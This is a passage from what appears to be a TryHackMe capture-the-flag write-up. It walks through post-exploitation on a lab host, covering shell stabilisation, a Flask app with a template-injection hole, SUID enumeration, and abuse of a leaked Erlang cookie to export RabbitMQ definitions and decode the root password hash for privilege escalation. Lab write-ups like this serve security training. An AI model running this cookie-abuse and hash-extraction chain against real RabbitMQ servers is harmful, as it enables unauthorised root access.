python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# 
stty raw -echo;fg
reset
```

Now we have proper shell.


```bash
azrael@forge:~/chatbotServer$ cat chatbot.py 
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

@app.route('/', methods=['POST'])
def index():
    data = request.get_json()
    if not data or 'username' not in data:
        return jsonify({"error": "username parameter is required"}), 400
    
    username = data['username']
    template = '''<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, {}, our chatbot server is currently under development.</h1>
 </body>
</html>'''.format(username)
    
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True, port=8000)
```


```bash
azrael@forge:~$ ls -la
total 52
drwx------ 9 azrael azrael 4096 Sep 12  2024 .
drwxr-xr-x 3 root   root   4096 Jul 18  2024 ..
lrwxrwxrwx 1 azrael azrael    9 Mar 22  2024 .bash_history -> /dev/null
-rw-r--r-- 1 azrael azrael  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 azrael azrael 3771 Feb 25  2020 .bashrc
drwx------ 3 azrael azrael 4096 Jul 18  2024 .cache
drwxrwxr-x 4 azrael azrael 4096 Aug 16  2024 chatbotServer
drwx------ 4 azrael azrael 4096 Jul 18  2024 .config
drwx------ 3 azrael azrael 4096 Sep 20  2024 .gnupg
drwxrwxr-x 5 azrael azrael 4096 Jul 18  2024 .local
drwxrwxr-x 4 azrael azrael 4096 Jul 18  2024 .npm
-rw-r--r-- 1 azrael azrael  807 Feb 25  2020 .profile
drwx------ 3 azrael azrael 4096 Mar 22  2024 snap
-rw------- 1 azrael azrael   33 Aug 11  2024 user.txt
azrael@forge:~$ cat user.txt 
*****************************
```


```bash
azrael@forge:~$ find / -type f -perm /4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/at
/usr/bin/fusermount3
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/snap/snapd/18357/usr/lib/snapd/snap-confine
/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
```

Lets run linpeas.


found this erlang cookie file 
```text
LF8W3QbjYGve3Cuw
```

found this
```text
/usr/local/bin/generate_erlang_cookie.sh
/usr/local/bin/change_cookie_permissions.sh
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh
```


```bash
azrael@forge:/usr/local/bin$ cat change_cookie_permissions.sh 
#!/bin/bash

# Sleep for 1 minute
sleep 30

head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16 > /var/lib/rabbitmq/.erlang.cookie
chmod 400 /var/lib/rabbitmq/.erlang.cookie
systemctl restart rabbitmq-server.service
# Change the file permissions
chmod 404 /var/lib/rabbitmq/.erlang.cookie
chmod +rx /var/lib/rabbitmq
```

```bash
azrael@forge:/usr/local/bin$ cat generate_erlang_cookie.sh 
#!/bin/bash
head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16 > /var/lib/rabbitmq/.erlang.cookie
chown rabbitmq:rabbitmq /var/lib/rabbitmq/.erlang.cookie
chmod 400 /var/lib/rabbitmq/.erlang.cookie
```

remember there is erlang shit is open.

Lets connect them we have the cookie


Add forge to the `/etc/hosts` file



```bash
❯ docker run --mount type=bind,source=/etc/hosts,target=/etc/hosts,readonly -it --rm rabbitmq:management-alpine bash                      
5468a1f12f60:/# rabbitmqctl --erlang-cookie 'LF8W3QbjYGve3Cuw' --node rabbit@forge status
Status of node rabbit@forge ...
[]
Runtime

OS PID: 1177
OS: Linux
Uptime (seconds): 8849
Is under maintenance?: false
RabbitMQ version: 3.9.13
RabbitMQ release series support status: see https://www.rabbitmq.com/release-information
Node name: rabbit@forge
Erlang configuration: Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
Crypto library: 
Erlang processes: 404 used, 1048576 limit
Scheduler run queue: 1
Cluster heartbeat timeout (net_ticktime): 60

Plugins

Enabled plugin file: /etc/rabbitmq/enabled_plugins
Enabled plugins:

 * rabbitmq_management
 * amqp_client
 * rabbitmq_web_dispatch
 * cowboy
 * cowlib
 * rabbitmq_management_agent

Data directory

Node data directory: /var/lib/rabbitmq/mnesia/rabbit@forge
Raft data directory: /var/lib/rabbitmq/mnesia/rabbit@forge/quorum/rabbit@forge

Config files

 * /etc/rabbitmq/rabbitmq.conf

Log file(s)

 * /var/log/rabbitmq/rabbit@forge.log
 * /var/log/rabbitmq/rabbit@forge_upgrade.log
 * <stdout>

Alarms

(none)

Tags

(none)

Memory

Total memory used: 0.1367 gb
Calculation strategy: rss
Memory high watermark setting: 0.4 of available memory, computed to: 1.6207 gb

reserved_unallocated: 0.0752 gb (54.97 %)
code: 0.0353 gb (25.84 %)
other_proc: 0.0186 gb (13.63 %)
other_system: 0.0133 gb (9.72 %)
binary: 0.0106 gb (7.74 %)
other_ets: 0.0034 gb (2.47 %)
plugins: 0.0021 gb (1.56 %)
atom: 0.0014 gb (1.04 %)
connection_other: 0.0006 gb (0.47 %)
mgmt_db: 0.0005 gb (0.38 %)
metrics: 0.0003 gb (0.19 %)
connection_readers: 0.0001 gb (0.07 %)
mnesia: 0.0001 gb (0.07 %)
quorum_ets: 0.0 gb (0.02 %)
msg_index: 0.0 gb (0.02 %)
queue_procs: 0.0 gb (0.02 %)
connection_channels: 0.0 gb (0.01 %)
connection_writers: 0.0 gb (0.0 %)
stream_queue_procs: 0.0 gb (0.0 %)
stream_queue_replica_reader_procs: 0.0 gb (0.0 %)
queue_slave_procs: 0.0 gb (0.0 %)
quorum_queue_procs: 0.0 gb (0.0 %)
stream_queue_coordinator_procs: 0.0 gb (0.0 %)
allocated_unused: 0.0 gb (0.0 %)

File Descriptors

Total: 6, limit: 65439

Free Disk Space

Low free disk space watermark: 0.05 gb
Free disk space: 5.2408 gb

Totals

Connection count: 4
Queue count: 1
Virtual host count: 1

Listeners

Interface: [::], port: 15672, protocol: http, purpose: HTTP API
Interface: [::], port: 25672, protocol: clustering, purpose: inter-node and CLI tool communication
Interface: 127.0.0.1, port: 5672, protocol: amqp, purpose: AMQP 0-9-1 and AMQP 1.0
```



```bash
5468a1f12f60:/# rabbitmqctl --erlang-cookie 'LF8W3QbjYGve3Cuw' --node rabbit@forge list_users
Listing users ...
user	tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.	[]
root	[administrator]
```

Lets crack root user password then



```bash
5468a1f12f60:/# rabbitmqctl --erlang-cookie 'LF8W3QbjYGve3Cuw' --node rabbit@forge export_definitions /tmp/def.json
Exporting definitions in JSON to a file at "/tmp/def.json" ...
5468a1f12f60:/# cat /tmp/def.json | jq
{
  "permissions": [
    {
      "configure": ".*",
      "read": ".*",
      "user": "root",
      "vhost": "/",
      "write": ".*"
    }
  ],
  "bindings": [],
  "queues": [
    {
      "arguments": {},
      "auto_delete": false,
      "durable": true,
      "name": "tasks",
      "type": "classic",
      "vhost": "/"
    }
  ],
  "policies": [],
  "parameters": [],
  "rabbitmq_version": "3.9.13",
  "exchanges": [],
  "global_parameters": [
    {
      "name": "cluster_name",
      "value": "rabbit@forge"
    }
  ],
  "rabbit_version": "3.9.13",
  "topic_permissions": [
    {
      "exchange": "",
      "read": ".*",
      "user": "root",
      "vhost": "/",
      "write": ".*"
    }
  ],
  "users": [
    {
      "hashing_algorithm": "rabbit_password_hashing_sha256",
      "limits": {},
      "name": "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.",
      "password_hash": "********************/*********************",
      "tags": []
    },
    {
      "hashing_algorithm": "rabbit_password_hashing_sha256",
      "limits": {},
      "name": "root",
      "password_hash": "****************************/***********************",
      "tags": [
        "administrator"
      ]
    }
  ],
  "vhosts": [
    {
      "limits": [],
      "metadata": {
        "description": "Default virtual host",
        "tags": []
      },
      "name": "/"
    }
  ]
}
```


We can see root hash. Lets look at the docs to which hashing_algorithm and salting used.

[Credentials and Passwords | RabbitMQ](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm)

![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo10.webp){: width="972" height="589" }



```bash
❯ echo "****************/*******************" | base64 -d | xxd -p -c 100
```


After removing first 4 bytes now we have the root password.




```bash
azrael@forge:/usr/local/bin$ su - root
Password: 
root@forge:~# ls
forge_web_service  root.txt  snap
root@forge:~# cat root.txt 
*******************************
```
